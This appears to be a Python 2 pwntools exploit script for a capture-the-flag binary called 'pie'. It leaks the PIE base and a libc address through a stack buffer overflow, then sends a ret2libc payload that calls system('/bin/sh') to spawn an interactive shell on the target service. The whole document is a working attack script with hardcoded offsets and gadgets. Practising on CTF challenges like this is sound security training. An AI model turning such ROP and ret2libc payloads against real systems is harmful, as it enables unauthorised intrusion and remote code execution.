#!/usr/bin/python2

from pwn import *

binary = './public/pie'
elf = ELF(binary)
context.binary = binary
PROCESS = [binary]
context.terminal = ['tilix', '-a', 'app-new-session', '-e']

HOST = '192.168.125.10'
PORT = 61337


def run():
    if args.R:
        return remote(HOST, PORT)
    else:
        return process(PROCESS)


r = run()
if args.D:
    gdb.attach(r, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    breakrva 0x85d
        ''')

# Addresses / Gadgets
PIE_PUTS = 0x530
PIE_MAIN = 0x86b
PIE_GOT_FFLUSH = 0x1fc8
PIE_GOT_READ = 0x1fc0
PIE_GOT_PUTS = 0x1fcc
LIBC_READ = 0x0d4350
LIBC_SYSTEM_OFF = 0x03a940
LIBC_BIN_SH = 0x15902b

# Leak PIE Base
r.recvuntil('main menu: ')
r.sendline('2')
r.recvuntil('Give me your pie: \n')
payload = 'A' * 31
r.sendline(payload)
r.recvline()
leaks = r.recvline()
log.info("Got Leak: {}".format(hex(u32(leaks[0:4]))))
# log.info("Got Leak: {}".format(hex(u32(leaks[4:8]))))
log.info("Got EBX: {}".format(hex(u32(leaks[8:12]))))
# log.info("Got Leak: {}".format(hex(u32(leaks[12:16]))))
PIE_BASE = u32(leaks[0:4]) & 0xfffff000
EBX = u32(leaks[8:12])
log.info("Got PIE base: {}".format(hex(PIE_BASE)))

# Leak Libc using PUTS
r.recvuntil('main menu: ')
r.sendline('2')
r.recvuntil('Give me your pie: \n')
OFFSET = cyclic_find('maaa')  # cyclic(256)
payload = 'A' * (OFFSET - 8)
payload += p32(EBX)  # so we don't fuck up jump table? ebp-4
payload += 'A' * 4  # ebp   
payload += p32(PIE_BASE + PIE_PUTS)
payload += p32(PIE_BASE + PIE_MAIN)  # ret for main()
payload += p32(PIE_BASE + PIE_GOT_READ)  # leak READ
r.sendline(payload)
r.recvline()
r.recvline()

LEAKED_GOT = r.recvline().strip()
LEAKED_READ_LIBC = u32(LEAKED_GOT[0:4])
LEAKED_PRINTF_LIBC = u32(LEAKED_GOT[4:8])
LEAKED_FFLUSH_LIBC = u32(LEAKED_GOT[8:12])
log.info("Got read@glibc: {}".format(hex(LEAKED_READ_LIBC)))
log.info("Got printf@glibc: {}".format(hex(LEAKED_PRINTF_LIBC)))
log.info("Got fflush@glibc: {}".format(hex(LEAKED_FFLUSH_LIBC)))
LIBC_BASE = LEAKED_READ_LIBC - LIBC_READ
SYSTEM = LIBC_BASE + LIBC_SYSTEM_OFF
BINSH = LIBC_BASE + LIBC_BIN_SH
log.info("Got LIBC BASE: {}".format(hex(LIBC_BASE)))
log.info("Got SYSTEM: {}".format(hex(SYSTEM)))
log.info("Got BINSH: {}".format(hex(BINSH)))

# Send payload
r.recvuntil('main menu: ')
r.sendline('2')
r.recvuntil('Give me your pie: \n')
payload = 'A' * (OFFSET)
# payload += p32(EBX)  # so we don't fuck up jump table? ebp-4
# payload += p32(EBX)  # ebp
payload += p32(SYSTEM)
payload += p32(0xdeadbeef)
payload += p32(BINSH)
r.sendline(payload)
r.interactive()
